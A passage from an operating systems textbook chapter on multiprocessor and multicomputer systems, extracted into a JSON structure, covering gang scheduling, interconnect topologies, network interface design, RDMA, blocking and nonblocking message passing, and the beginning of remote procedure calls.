separately, using priorities or some other means. By trying to\n542 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nkeep a thread on the same CPU for its entire lifetime, cache affinity is maximized.\r\nHowever, if a CPU has no threads to run, it takes one from another CPU rather than\r\ngo idle.\r\nTw o-level scheduling has three benefits. First, it distributes the load roughly\r\nev enly over the available CPUs. Second, advantage is taken of cache affinity\r\nwhere possible. Third, by giving each CPU its own ready list, contention for the\r\nready lists is minimized because attempts to use another CPU’s ready list are rel\u0002atively infrequent.\r\nSpace Sharing\r\nThe other general approach to multiprocessor scheduling can be used when\r\nthreads are related to one another in some way. Earlier we mentioned the example\r\nof parallel make as one case. It also often occurs that a single process has multiple\r\nthreads that work together. For example, if the threads of a process communicate a\r\nlot, it is useful to have them running at the same time. Scheduling multiple threads\r\nat the same time across multiple CPUs is called space sharing.\r\nThe simplest space-sharing algorithm works like this. Assume that an entire\r\ngroup of related threads is created at once. At the time it is created, the scheduler\r\nchecks to see if there are as many free CPUs as there are threads. If there are, each\r\nthread is given its own dedicated (i.e., nonmultiprogrammed) CPU and they all\r\nstart. If there are not enough CPUs, none of the threads are started until enough\r\nCPUs are available. Each thread holds onto its CPU until it terminates, at which\r\ntime the CPU is put back into the pool of available CPUs. If a thread blocks on\r\nI/O, it continues to hold the CPU, which is simply idle until the thread wakes up.\r\nWhen the next batch of threads appears, the same algorithm is applied.\r\nAt any instant of time, the set of CPUs is statically partitioned into some num\u0002ber of partitions, each one running the threads of one process. In Fig. 8-13, we\r\nhave partitions of sizes 4, 6, 8, and 12 CPUs, with 2 CPUs unassigned, for ex\u0002ample. As time goes on, the number and size of the partitions will change as new\r\nthreads are created and old ones finish and terminate.\r\n0 1 2 3 4 5 6 7\r\n8 9 10 11 12 13 14 15\r\n16 17 18 19 20 21 22 23\r\n24 25 26 27 28 29 30 31\r\n4-CPU partition\r\n12-CPU partition Unassigned CPU\r\n6-CPU partition \r\n8-CPU partition \r\nFigure 8-13. A set of 32 CPUs split into four partitions, with two CPUs\r\navailable.\nSEC. 8.1 MULTIPROCESSORS 543\r\nPeriodically, scheduling decisions have to be made. In uniprocessor systems,\r\nshortest job first is a well-known algorithm for batch scheduling. The analogous al\u0002gorithm for a multiprocessor is to choose the process needing the smallest number\r\nof CPU cycles, that is, the thread whose CPU-count × run-time is the smallest of\r\nthe candidates. However, in practice, this information is rarely available, so the al\u0002gorithm is hard to carry out. In fact, studies have shown that, in practice, beating\r\nfirst-come, first-served is hard to do (Krueger et al., 1994).\r\nIn this simple partitioning model, a thread just asks for some number of CPUs\r\nand either gets them all or has to wait until they are available. A different approach\r\nis for threads to actively manage the degree of parallelism. One method for manag\u0002ing the parallelism is to have a central server that keeps track of which threads are\r\nrunning and want to run and what their minimum and maximum CPU requirements\r\nare (Tucker and Gupta, 1989). Periodically, each application polls the central ser\u0002ver to ask how many CPUs it may use. It then adjusts the number of threads up or\r\ndown to match what is available.\r\nFor example, a Web server can have 5, 10, 20, or any other number of threads\r\nrunning in parallel. If it currently has 10 threads and there is suddenly more de\u0002mand for CPUs and it is told to drop to fiv e, when the next fiv e threads finish their\r\ncurrent work, they are told to exit instead of being given new work. This scheme\r\nallows the partition sizes to vary dynamically to match the current workload better\r\nthan the fixed system of Fig. 8-13.\r\nGang Scheduling\r\nA clear advantage of space sharing is the elimination of multiprogramming,\r\nwhich eliminates the context-switching overhead. However, an equally clear disad\u0002vantage is the time wasted when a CPU blocks and has nothing at all to do until it\r\nbecomes ready again. Consequently, people have looked for algorithms that at\u0002tempt to schedule in both time and space together, especially for threads that create\r\nmultiple threads, which usually need to communicate with one another.\r\nTo see the kind of problem that can occur when the threads of a process are in\u0002dependently scheduled, consider a system with threads A0 and A1 belonging to\r\nprocess A and threads B0 and B1 belonging to process B. Threads A0 and B0 are\r\ntimeshared on CPU 0; threads A1 and B1 are timeshared on CPU 1. Threads A0\r\nand A1 need to communicate often. The communication pattern is that A0 sends A1\r\na message, with A1 then sending back a reply to A0, followed by another such se\u0002quence, common in client-server situations. Suppose luck has it that A0 and B1\r\nstart first, as shown in Fig. 8-14.\r\nIn time slice 0, A0 sends A1 a request, but A1 does not get it until it runs in\r\ntime slice 1 starting at 100 msec. It sends the reply immediately, but A0 does not\r\nget the reply until it runs again at 200 msec. The net result is one request-reply se\u0002quence every 200 msec. Not very good performance.\n544 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nA0 B0 A0 B0 A0 B0\r\nB1 A1 B1 A1 B1 A1\r\nThread A0 running\r\n0 100 200 300 400 500 600\r\nCPU 0\r\nCPU 1\r\nTime\r\nRequest 1 Request 2\r\nReply 2 Reply 1\r\nFigure 8-14. Communication between two threads belonging to thread A that are\r\nrunning out of phase.\r\nThe solution to this problem is gang scheduling, which is an outgrowth of co\u0002scheduling (Ousterhout, 1982). Gang scheduling has three parts:\r\n1. Groups of related threads are scheduled as a unit, a gang.\r\n2. All members of a gang run at once on different timeshared CPUs.\r\n3. All gang members start and end their time slices together.\r\nThe trick that makes gang scheduling work is that all CPUs are scheduled syn\u0002chronously. Doing this means that time is divided into discrete quanta as we had in\r\nFig. 8-14. At the start of each new quantum, all the CPUs are rescheduled, with a\r\nnew thread being started on each one. At the start of the next quantum, another\r\nscheduling event happens. In between, no scheduling is done. If a thread blocks,\r\nits CPU stays idle until the end of the quantum.\r\nAn example of how gang scheduling works is given in Fig. 8-15. Here we\r\nhave a multiprocessor with six CPUs being used by fiv e processes, A through E,\r\nwith a total of 24 ready threads. During time slot 0, threads A0 through A6 are\r\nscheduled and run. During time slot 1, threads B0, B1, B2, C0, C1, and C2 are\r\nscheduled and run. During time slot 2, D’s fiv e threads and E0 get to run. The re\u0002maining six threads belonging to thread E run in time slot 3. Then the cycle re\u0002peats, with slot 4 being the same as slot 0 and so on.\r\nThe idea of gang scheduling is to have all the threads of a process run together,\r\nat the same time, on different CPUs, so that if one of them sends a request to an\u0002other one, it will get the message almost immediately and be able to reply almost\r\nimmediately. In Fig. 8-15, since all the A threads are running together, during one\r\nquantum, they may send and receive a very large number of messages in one\r\nquantum, thus eliminating the problem of Fig. 8-14.\nSEC."
          }
        }
      },
      "8.2 MULTICOMPUTERS": {
        "page": 576,
        "children": {
          "8.2.1 Multicomputer Hardware": {
            "page": 577,
            "content": "8.2.1 Multicomputer Hardware\r\nThe basic node of a multicomputer consists of a CPU, memory, a network in\u0002terface, and sometimes a hard disk. The node may be packaged in a standard PC\r\ncase, but the monitor, keyboard, and mouse are nearly always absent. Sometimes\r\nthis configuration is called a headless workstation because there is no user with a\r\nhead in front of it. A workstation with a human user should logically be called a\r\n‘‘headed workstation,’’ but for some reason it is not. In some cases, the PC con\u0002tains a 2-way or 4-way multiprocessor board, possibly each with a dual-, quad- or\r\nocta-core chip, instead of a single CPU, but for simplicity, we will assume that\r\neach node has one CPU. Often hundreds or even thousands of nodes are hooked\r\ntogether to form a multicomputer. Below we will say a little about how this hard\u0002ware is organized.\r\nInterconnection Technology\r\nEach node has a network interface card with one or two cables (or fibers) com\u0002ing out of it. These cables connect either to other nodes or to switches. In a small\r\nsystem, there may be one switch to which all the nodes are connected in the star\r\ntopology of Fig. 8-16(a). Modern switched Ethernets use this topology.\r\n(a)\r\n(d)\r\n(b)\r\n(e)\r\n(c)\r\n(f)\r\nFigure 8-16. Various interconnect topologies. (a) A single switch. (b) A ring.\r\n(c) A grid. (d) A double torus. (e) A cube. (f) A 4D hypercube.\nSEC. 8.2 MULTICOMPUTERS 547\r\nAs an alternative to the single-switch design, the nodes may form a ring, with\r\ntwo wires coming out the network interface card, one into the node on the left and\r\none going into the node on the right, as shown in Fig. 8-16(b). In this topology, no\r\nswitches are needed and none are shown.\r\nThe grid or mesh of Fig. 8-16(c) is a two-dimensional design that has been\r\nused in many commercial systems. It is highly regular and easy to scale up to large\r\nsizes. It has a diameter, which is the longest path between any two nodes, and\r\nwhich increases only as the square root of the number of nodes. A variant on the\r\ngrid is the double torus of Fig. 8-16(d), which is a grid with the edges connected.\r\nNot only is it more fault tolerant than the grid, but the diameter is also less because\r\nthe opposite corners can now communicate in only two hops.\r\nThe cube of Fig. 8-16(e) is a regular three-dimensional topology. We hav e il\u0002lustrated a 2 × 2 × 2 cube, but in the most general case it could be a k × k × k\r\ncube. In Fig. 8-16(f) we have a four-dimensional cube built from two three-dimen\u0002sional cubes with the corresponding nodes connected. We could make a fiv e\u0002dimensional cube by cloning the structure of Fig. 8-16(f) and connecting the cor\u0002responding nodes to form a block of four cubes. To go to six dimensions, we could\r\nreplicate the block of four cubes and interconnect the corresponding nodes, and so\r\non. An n-dimensional cube formed this way is called a hypercube.\r\nMany parallel computers use a hypercube topology because the diameter\r\ngrows linearly with the dimensionality. Put in other words, the diameter is the base\r\n2 logarithm of the number of nodes. For example, a 10-dimensional hypercube has\r\n1024 nodes but a diameter of only 10, giving excellent delay properties. Note that\r\nin contrast, 1024 nodes arranged as a 32 × 32 grid have a diameter of 62, more\r\nthan six times worse than the hypercube. The price paid for the smaller diameter is\r\nthat the fanout, and thus the number of links (and the cost), is much larger for the\r\nhypercube.\r\nTw o kinds of switching schemes are used in multicomputers. In the first one,\r\neach message is first broken up (either by the user software or the network inter\u0002face) into a chunk of some maximum length called a packet. The switching\r\nscheme, called store-and-forward packet switching, consists of the packet being\r\ninjected into the first switch by the source node’s network interface board, as\r\nshown in Fig. 8-17(a). The bits come in one at a time, and when the whole packet\r\nhas arrived at an input buffer, it is copied to the line leading to the next switch\r\nalong the path, as shown in Fig. 8-17(b). When the packet arrives at the switch at\u0002tached to the destination node, as shown in Fig. 8-17(c), the packet is copied to that\r\nnode’s network interface board and eventually to its RAM.\r\nWhile store-and-forward packet switching is flexible and efficient, it does have\r\nthe problem of increasing latency (delay) through the interconnection network.\r\nSuppose that the time to move a packet one hop in Fig. 8-17 is T nsec. Since the\r\npacket must be copied four times to get it from CPU 1 to CPU 2 (to A, to C, to D,\r\nand to the destination CPU), and no copy can begin until the previous one is fin\u0002ished, the latency through the interconnection network is 4T. One way out is to\n548 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nCPU 1 Input port\r\n(a)\r\nOutput port\r\nEntire\r\npacket\r\nEntire\r\npacket\r\nFour-port\r\nswitch\r\nC\r\nA\r\nCPU 2\r\nEntire\r\npacket\r\nD\r\nB\r\n(b)\r\nC\r\nA\r\nD\r\nB\r\n(c)\r\nC\r\nA\r\nD\r\nB\r\nFigure 8-17. Store-and-forward packet switching.\r\ndesign a network in which a packet can be logically divided into smaller units. As\r\nsoon as the first unit arrives at a switch, it can be forwarded, even before the tail\r\nhas arrived. Conceivably, the unit could be as small as 1 bit.\r\nThe other switching regime, circuit switching, consists of the first switch first\r\nestablishing a path through all the switches to the destination switch. Once that\r\npath has been set up, the bits are pumped all the way from the source to the desti\u0002nation nonstop as fast as possible. There is no intermediate buffering at the inter\u0002vening switches. Circuit switching requires a setup phase, which takes some time,\r\nbut is faster once the setup has been completed. After the packet has been sent, the\r\npath must be torn down again. A variation on circuit switching, called wormhole\r\nrouting, breaks each packet up into subpackets and allows the first subpacket to\r\nstart flowing even before the full path has been built.\r\nNetwork Interfaces\r\nAll the nodes in a multicomputer have a plug-in board containing the node’s\r\nconnection to the interconnection network that holds the multicomputer together.\r\nThe way these boards are built and how they connect to the main CPU and RAM\r\nhave substantial implications for the operating system. We will now briefly look at\r\nsome of the issues here. This material is based in part on the work of Bhoedjang\r\n(2000).\r\nIn virtually all multicomputers, the interface board contains substantial RAM\r\nfor holding outgoing and incoming packets. Usually, an outgoing packet has to be\r\ncopied to the interface board’s RAM before it can be transmitted to the first switch.\r\nThe reason for this design is that many interconnection networks are synchronous,\r\nso that once a packet transmission has started, the bits must continue flowing at a\nSEC. 8.2 MULTICOMPUTERS 549\r\nconstant rate. If the packet is in the main RAM, this continuous flow out onto the\r\nnetwork cannot be guaranteed due to other traffic on the memory bus. Using a ded\u0002icated RAM on the interface board eliminates this problem. This design is shown\r\nin Fig. 8-18.\r\nCPU\r\nCPU\r\nCPU\r\nCPU\r\nSwitch\r\nNode 2\r\nMain RAM\r\nMain RAM\r\nNode 4 Interface\r\nboard\r\nOptional\r\non- board\r\nCPU\r\nInterface\r\nboard\r\nRAM\r\nNode 3\r\nMain RAM\r\nMain RAM\r\nNode 1\r\n3\r\n2\r\n1\r\n4 5\r\nUser\r\nOS\r\nFigure 8-18. Position of the network interface boards in a multicomputer.\r\nThe same problem occurs with incoming packets. The bits arrive from the net\u0002work at a constant and often extremely high rate. If the network interface board\r\ncannot store them in real time as they arrive, data will be lost. Again here, trying to\r\ngo over the system bus (e.g., the PCI bus) to the main RAM is too risky. Since the\r\nnetwork board is typically plugged into the PCI bus, this is the only connection it\r\nhas to the main RAM, so competing for this bus with the disk and every other I/O\r\ndevice is inevitable. It is safer to store incoming packets in the interface board’s\r\nprivate RAM and then copy them to the main RAM later.\r\nThe interface board may have one or more DMA channels or even a complete\r\nCPU (or maybe even multiple CPUs) on board. The DMA channels can copy pack\u0002ets between the interface board and the main RAM at high speed by requesting\r\nblock transfers on the system bus, thus transferring several words without having to\r\nrequest the bus separately for each word. However, it is precisely this kind of block\r\ntransfer, which ties up the system bus for multiple bus cycles, that makes the inter\u0002face board RAM necessary in the first place.\r\nMany interface boards have a CPU on them, possibly in addition to one or\r\nmore DMA channels. They are called network processors and are becoming in\u0002creasingly powerful (El Ferkouss et al., 2011). This design means that the main\r\nCPU can offload some work to the network board, such as handling reliable trans\u0002mission (if the underlying hardware can lose packets), multicasting (sending a\r\npacket to more than one destination), compression/decompression, encryption/de\u0002cryption, and taking care of protection in a system that has multiple processes.\n550 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nHowever, having two CPUs means that they must synchronize to avoid race condi\u0002tions, which adds extra overhead and means more work for the operating system.\r\nCopying data across layers is safe, but not necessarily efficient. For instance, a\r\nbrower requesting data from a remote web server will create a request in the brow\u0002ser’s address space. That request is subsequently copied to the kernel so that TCP\r\nand IP can handle it. Next, the data are copied to the memory of the network inter\u0002face. On the other end, the inverse happens: the data are copied from the network\r\ncard to a kernel buffer, and from a kernel buffer to the Web server. Quite a few cop\u0002ies, unfortunately. Each copy introduces overhead, not just the copying itself, but\r\nalso the pressure on the cache, TLB, etc. As a consequence, the latency over such\r\nnetwork connections is high.\r\nIn the next section, we discuss techniques to reduce the overhead due to copy\u0002ing, cache pollution, and context switching as much as possible."
          },
          "8.2.2 Low-Level Communication Software": {
            "page": 581,
            "content": "8.2.2 Low-Level Communication Software\r\nThe enemy of high-performance communication in multicomputer systems is\r\nexcess copying of packets. In the best case, there will be one copy from RAM to\r\nthe interface board at the source node, one copy from the source interface board to\r\nthe destination interface board (if no storing and forwarding along the path occurs),\r\nand one copy from there to the destination RAM, a total of three copies. However,\r\nin many systems it is even worse. In particular, if the interface board is mapped\r\ninto kernel virtual address space and not user virtual address space, a user process\r\ncan send a packet only by issuing a system call that traps to the kernel. The kernels\r\nmay have to copy the packets to their own memory both on output and on input,\r\nfor example, to avoid page faults while transmitting over the network. Also, the re\u0002ceiving kernel probably does not know where to put incoming packets until it has\r\nhad a chance to examine them. These fiv e copy steps are illustrated in Fig. 8-18.\r\nIf copies to and from RAM are the bottleneck, the extra copies to and from the\r\nkernel may double the end-to-end delay and cut the throughput in half. To avoid\r\nthis performance hit, many multicomputers map the interface board directly into\r\nuser space and allow the user process to put the packets on the board directly, with\u0002out the kernel being involved. While this approach definitely helps performance, it\r\nintroduces two problems.\r\nFirst, what if several processes are running on the node and need network ac\u0002cess to send packets? Which one gets the interface board in its address space?\r\nHaving a system call to map the board in and out of a virtual address space is ex\u0002pensive, but if only one process gets the board, how do the other ones send pack\u0002ets? And what happens if the board is mapped into process A’s virtual address\r\nspace and a packet arrives for process B, especially if A and B have different own\u0002ers, neither of whom wants to put in any effort to help the other?\r\nOne solution is to map the interface board into all processes that need it, but\r\nthen a mechanism is needed to avoid race conditions. For example, if A claims a\nSEC. 8.2 MULTICOMPUTERS 551\r\nbuffer on the interface board, and then, due to a time slice, B runs and claims the\r\nsame buffer, disaster results. Some kind of synchronization mechanism is needed,\r\nbut these mechanisms, such as mutexes, work only when the processes are as\u0002sumed to be cooperating. In a shared environment with multiple users all in a\r\nhurry to get their work done, one user might just lock the mutex associated with\r\nthe board and never release it. The conclusion here is that mapping the interface\r\nboard into user space really works well only when there is just one user process\r\nrunning on each node unless special precautions are taken (e.g., different processes\r\nget different portions of the interface RAM mapped into their address spaces).\r\nThe second problem is that the kernel may well need access to the intercon\u0002nection network itself, for example, to access the file system on a remote node.\r\nHaving the kernel share the interface board with any users is not a good idea. Sup\u0002pose that while the board was mapped into user space, a kernel packet arrived. Or\r\nsuppose that the user process sent a packet to a remote machine pretending to be\r\nthe kernel. The conclusion is that the simplest design is to have two network inter\u0002face boards, one mapped into user space for application traffic and one mapped\r\ninto kernel space for use by the operating system. Many multicomputers do pre\u0002cisely this.\r\nOn the other hand, newer network interfaces are frequently multiqueue, which\r\nmeans that they hav e more than one buffer to support multiple users efficiently. For\r\ninstance, the Intel I350 series of network cards has 8 send and 8 receive queues,\r\nand is virtualizable to many virtual ports. Better still, the card supports core affin\u0002ity. Specifically, it has its own hashing logic to help steer each packet to a suitable\r\nprocess. As it is faster to process all segments in the same TCP flow on the same\r\nprocessor (where the caches are warm), the card can use the hashing logic to hash\r\nthe TCP flow fields (IP addresses and TCP port numbers) and add all segments\r\nwith the same hash on the same queue that is served by a specific core. This is also\r\nuseful for virtualization, as it allows us to give each virtual machine its own queue.\r\nNode-to-Network Interface Communication\r\nAnother issue is how to get packets onto the interface board. The fastest way is\r\nto use the DMA chip on the board to just copy them in from RAM. The problem\r\nwith this approach is that DMA may use physical rather than virtual addresses and\r\nruns independently of the CPU, unless an I/O MMU is present. To start with, al\u0002though a user process certainly knows the virtual address of any packet it wants to\r\nsend, it generally does not know the physical address. Making a system call to do\r\nthe virtual-to-physical mapping is undesirable, since the point of putting the inter\u0002face board in user space in the first place was to avoid having to make a system call\r\nfor each packet to be sent.\r\nIn addition, if the operating system decides to replace a page while the DMA\r\nchip is copying a packet from it, the wrong data will be transmitted. Worse yet, if\r\nthe operating system replaces a page while the DMA chip is copying an incoming\n552 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\npacket to it, not only will the incoming packet be lost, but also a page of innocent\r\nmemory will be ruined, probably with disastrous consequences shortly.\r\nThese problems can be avoided by having system calls to pin and unpin pages\r\nin memory, marking them as temporarily unpageable. However, having to make a\r\nsystem call to pin the page containing each outgoing packet and then having to\r\nmake another call later to unpin it is expensive. If packets are small, say, 64 bytes\r\nor less, the overhead for pinning and unpinning every buffer is prohibitive. For\r\nlarge packets, say, 1 KB or more, it may be tolerable. For sizes in between, it de\u0002pends on the details of the hardware. Besides introducing a performance hit, pin\u0002ning and unpinning pages adds to the software complexity.\r\nRemote Direct Memory Access\r\nIn some fields, high network latencies are simply not acceptable. For instance,\r\nfor certain applications in high-performance computing the computation time is\r\nstrongly dependent on the network latency. Likewise, high-frequency trading is all\r\nabout having computers perform transactions (buying and selling stock) at ex\u0002tremely high speeds—every microsecond counts. Whether or not it is wise to have\r\ncomputer programs trade millions of dollars worth of stock in a millisecond, when\r\npretty much all software tends to be buggy, is an interesting question for dining\r\nphilosophers to consider when they are not busy grabbing their forks. But not for\r\nthis book. The point here is that if you manage to get the latency down, it is sure to\r\nmake you very popular with your boss.\r\nIn these scenarios, it pays to reduce the amount of copying. For this reason,\r\nsome network interfaces support RDMA (Remote Direct Memory Access), a\r\ntechnique that allows one machine to perform a direct memory access from one\r\ncomputer to that of another. The RDMA does not involve either of the operating\r\nsystem and the data is directly fetched from, or written to, application memory.\r\nRDMA sounds great, but it is not without its disadvantages. Just like normal\r\nDMA, the operating system on the communicating nodes must pin the pages invol\u0002ved in the data exchange. Also, just placing data in a remote computer’s memory\r\nwill not reduce the latency much if the other program is not aware of it. A suc\u0002cessful RDMA does not automatically come with an explicit notification. Instead, a\r\ncommon solution is that a receiver polls on a byte in memory. When the transfer is\r\ndone, the sender modifies the byte to signal the receiver that there is new data.\r\nWhile this solution works, it is not ideal and wastes CPU cycles.\r\nFor really serious high-frequency trading, the network cards are custom built\r\nusing field-programmable gate arrays. They hav e wire-to-wire latency, from re\u0002ceiving the bits on the network card to transmitting a message to buy a few million\r\nworth of something, in well under a microsecond. Buying $1 million worth of\r\nstock in 1 μsec gives a performance of 1 terabuck/sec, which is nice if you can get\r\nthe ups and downs right, but is not for the faint of heart. Operating systems do not\r\nplay much of a role in such extreme settings.\nSEC. 8.2 MULTICOMPUTERS 553"
          },
          "8.2.3 User-Level Communication Software": {
            "page": 584,
            "content": "8.2.3 User-Level Communication Software\r\nProcesses on different CPUs on a multicomputer communicate by sending\r\nmessages to one another. In the simplest form, this message passing is exposed to\r\nthe user processes. In other words, the operating system provides a way to send\r\nand receive messages, and library procedures make these underlying calls available\r\nto user processes. In a more sophisticated form, the actual message passing is hid\u0002den from users by making remote communication look like a procedure call. We\r\nwill study both of these methods below.\r\nSend and Receive\r\nAt the barest minimum, the communication services provided can be reduced\r\nto two (library) calls, one for sending messages and one for receiving them. The\r\ncall for sending a message might be\r\nsend(dest, &mptr);\r\nand the call for receiving a message might be\r\nreceive(addr, &mptr);\r\nThe former sends the message pointed to by mptr to a process identified by dest\r\nand causes the called to be blocked until the message has been sent. The latter\r\ncauses the called to be blocked until a message arrives. When one does, the mes\u0002sage is copied to the buffer pointed to by mptr and the called is unblocked. The\r\naddr parameter specifies the address to which the receiver is listening. Many vari\u0002ants of these two procedures and their parameters are possible.\r\nOne issue is how addressing is done. Since multicomputers are static, with the\r\nnumber of CPUs fixed, the easiest way to handle addressing is to make addr a two\u0002part address consisting of a CPU number and a process or port number on the ad\u0002dressed CPU. In this way each CPU can manage its own addresses without poten\u0002tial conflicts.\r\nBlocking versus Nonblocking Calls\r\nThe calls described above are blocking calls (sometimes called synchronous\r\ncalls). When a process calls send, it specifies a destination and a buffer to send to\r\nthat destination. While the message is being sent, the sending process is blocked\r\n(i.e., suspended). The instruction following the call to send is not executed until\r\nthe message has been completely sent, as shown in Fig. 8-19(a). Similarly, a call\r\nto receive does not return control until a message has actually been received and\r\nput in the message buffer pointed to by the parameter. The process remains sus\u0002pended in receive until a message arrives, even if it takes hours. In some systems,\n554 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nthe receiver can specify from whom it wishes to receive, in which case it remains\r\nblocked until a message from that sender arrives.\r\nSender blocked\r\nSender\r\nblocked\r\nTrap to kernel,\r\nsender blocked\r\nMessage being sent\r\nMessage being sent\r\nSender running\r\nSender running\r\nReturn\r\nSender running\r\nSender running\r\nTrap\r\nMessage\r\ncopied to a\r\nkernel buffer\r\nReturn from kernel,\r\nsender released\r\n(a)\r\n(b)\r\nFigure 8-19. (a) A blocking send call. (b) A nonblocking send call.\r\nAn alternative to blocking calls is the use of nonblocking calls (sometimes\r\ncalled asynchronous calls). If send is nonblocking, it returns control to the called\r\nimmediately, before the message is sent. The advantage of this scheme is that the\r\nsending process can continue computing in parallel with the message transmission,\r\ninstead of having the CPU go idle (assuming no other process is runnable). The\r\nchoice between blocking and nonblocking primitives is normally made by the sys\u0002tem designers (i.e., either one primitive is available or the other), although in a few\r\nsystems both are available and users can choose their favorite.\r\nHowever, the performance advantage offered by nonblocking primitives is off\u0002set by a serious disadvantage: the sender cannot modify the message buffer until\r\nthe message has been sent. The consequences of the process overwriting the mes\u0002sage during transmission are too horrible to contemplate. Worse yet, the sending\r\nprocess has no idea of when the transmission is done, so it never knows when it is\r\nsafe to reuse the buffer. It can hardly avoid touching it forever.\r\nThere are three possible ways out. The first solution is to have the kernel copy\r\nthe message to an internal kernel buffer and then allow the process to continue, as\r\nshown in Fig. 8-19(b). From the sender’s point of view, this scheme is the same as\r\na blocking call: as soon as it gets control back, it is free to reuse the buffer. Of\nSEC. 8.2 MULTICOMPUTERS 555\r\ncourse, the message will not yet have been sent, but the sender is not hindered by\r\nthis fact. The disadvantage of this method is that every outgoing message has to be\r\ncopied from user space to kernel space. With many network interfaces, the mes\u0002sage will have to be copied to a hardware transmission buffer later anyway, so the\r\nfirst copy is essentially wasted. The extra copy can reduce the performance of the\r\nsystem considerably.\r\nThe second solution is to interrupt (signal) the sender when the message has\r\nbeen fully sent to inform it that the buffer is once again available. No copy is re\u0002quired here, which saves time, but user-level interrupts make programming tricky,\r\ndifficult, and subject to race conditions, which makes them irreproducible and\r\nnearly impossible to debug.\r\nThe third solution is to make the buffer copy on write, that is, to mark it as read\r\nonly until the message has been sent. If the buffer is reused before the message has\r\nbeen sent, a copy is made. The problem with this solution is that unless the buffer\r\nis isolated on its own page, writes to nearby variables will also force a copy. Also,\r\nextra administration is needed because the act of sending a message now implicitly\r\naffects the read/write status of the page. Finally, sooner or later the page is likely to\r\nbe written again, triggering a copy that may no longer be necessary.\r\nThus the choices on the sending side are\r\n1. Blocking send (CPU idle during message transmission).\r\n2. Nonblocking send with copy (CPU time wasted for the extra copy).\r\n3. Nonblocking send with interrupt (makes programming difficult).\r\n4. Copy on write (extra copy probably needed eventually).\r\nUnder normal conditions, the first choice is the most convenient, especially if mul\u0002tiple threads are available, in which case while one thread is blocked trying to\r\nsend, other threads can continue working. It also does not require any kernel buff\u0002ers to be managed. Furthermore, as can be seen from comparing Fig. 8-19(a) to\r\nFig. 8-19(b), the message will usually be out the door faster if no copy is required.\r\nFor the record, we would like to point out that some authors use a different cri\u0002terion to distinguish synchronous from asynchronous primitives. In the alternative\r\nview, a call is synchronous only if the sender is blocked until the message has been\r\nreceived and an acknowledgement sent back (Andrews, 1991). In the world of\r\nreal-time communication, synchronous has yet another meaning, which can lead to\r\nconfusion, unfortunately.\r\nJust as send can be blocking or nonblocking, so can receive. A blocking call\r\njust suspends the called until a message has arrived. If multiple threads are avail\u0002able, this is a simple approach. Alternatively, a nonblocking receive just tells the\r\nkernel where the buffer is and returns control almost immediately. An interrupt\r\ncan be used to signal that a message has arrived. However, interrupts are difficult\r\nto program and are also quite slow, so it may be preferable for the receiver to poll\n556 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nfor incoming messages using a procedure, poll, that tells whether any messages are\r\nwaiting. If so, the called can call get message, which returns the first arrived mes\u0002sage. In some systems, the compiler can insert poll calls in the code at appropriate\r\nplaces, although knowing how often to poll is tricky.\r\nYet another option is a scheme in which the arrival of a message causes a new\r\nthread to be created spontaneously in the receiving process’ address space. Such a\r\nthread is called a pop-up thread. It runs a procedure specified in advance and\r\nwhose parameter is a pointer to the incoming message. After processing the mes\u0002sage, it simply exits and is automatically destroyed.\r\nA variant on this idea is to run the receiver code directly in the interrupt hand\u0002ler, without going to the trouble of creating a pop-up thread. To make this scheme\r\nev en faster, the message itself contains the address of the handler, so when a mes\u0002sage arrives, the handler can be called in a few instructions. The big win here is\r\nthat no copying at all is needed. The handler takes the message from the interface\r\nboard and processes it on the fly. This scheme is called active messages (Von\r\nEicken et al., 1992). Since each message contains the address of the handler, ac\u0002tive messages work only when senders and receivers trust each other completely."
          },
          "8.2.4 Remote Procedure Call": {
            "page": 587,
            "content": "8.2.4 Remote Procedure Call\r\nAlthough the message-passing model provides a convenient way to structure a\r\nmulticomputer operating system, it suffers from one incurable flaw: the basic\r\nparadigm around which all communication is built is input/output. The procedures\r\nsend and receive are fundamentally engaged in doing I/O, and many people believe\r\nthat I/O is the wrong programming model.\r\nThis problem has long been known, but little was done about it until a paper by\r\nBirrell and Nelson (1984) introduced a completely different way of attacking the\r\nproblem. Although the idea is refreshingly simple (once someone has thought of\r\nit), the implications are often subtle. In this section we will examine the concept,\r\nits implementation, its strengths, and its weaknesses.\r\nIn a nutshell, what Birrell and Nelson suggested was allowing programs to call\r\nprocedures located on other CPUs. When a process on machine 1 calls a proce\u0002dure on machine 2, the calling process on 1 is suspended, and execution of the call\u0002ed procedure takes place on 2. Information can be transported from the called to\r\nthe callee in the parameters and can come back in the procedure result. No mes\u0002sage passing or I/O at all is visible to the programmer. This technique is known as\r\nRPC (Remote Procedure Call) and has become the basis of a large amount of\r\nmulticomputer software. Traditionally the calling procedure is known as the client\r\nand the called procedure is known as the server, and we will use those names here\r\ntoo.\r\nThe idea behind RPC is to make a remote procedure call look as much as pos\u0002sible like a local one. In the simplest form, to call a remote procedure, the client\r\nprogram must be bound with a small library procedure called the client stub that\nSEC. 8.2 MULTICOMPUTERS 557\r\nrepresents the server procedure in the client’s address space. Similarly, the server is\r\nbound with a procedure called the server stub. These procedures hide the fact that\r\nthe procedure call from the client to the server is not local.\r\nThe actual steps in making an RPC are shown in Fig. 8-20. Step 1 is the client\r\ncalling the client stub. This call is a local procedure call, with the parameters\r\npushed onto the stack in the normal way. Step 2 is the client stub packing the pa\u0002rameters into a message and making a system call to send the message. Packing the\r\nparameters is called marshalling. Step 3 is the kernel sending the message from\r\nthe client machine to the server machine. Step 4 is the kernel passing the incoming\r\npacket to the server stub (which would normally have called receive earlier).\r\nFinally, step 5 is the server stub calling the server procedure. The reply traces the\r\nsame path in the other direction.\r\nClient CPU\r\nClient\r\nstub Client\r\n2\r\n1\r\nOperating system\r\nServer CPU\r\nServer\r\nstub\r\n4\r\n3\r\n5\r\nOperating system\r\nServer\r\nNetwork\r\nFigure 8-20. Steps in making a remote procedure call. The stubs are shaded\r\ngray.\r\nThe key item to note here is that the client procedure, written by the user, just\r\nmakes a normal (i.e., local) procedure call to the client stub, which has the same\r\nname as the server procedure. Since the client procedure and client stub are in the\r\nsame address space, the parameters are passed in the usual way. Similarly, the ser\u0002ver procedure is called by a procedure in its address space with the parameters it\r\nexpects. To the server procedure, nothing is unusual. In this way, instead of doing\r\nI/O using send and receive, remote communication is done by faking a normal pro\u0002cedure call.\r\nImplementation 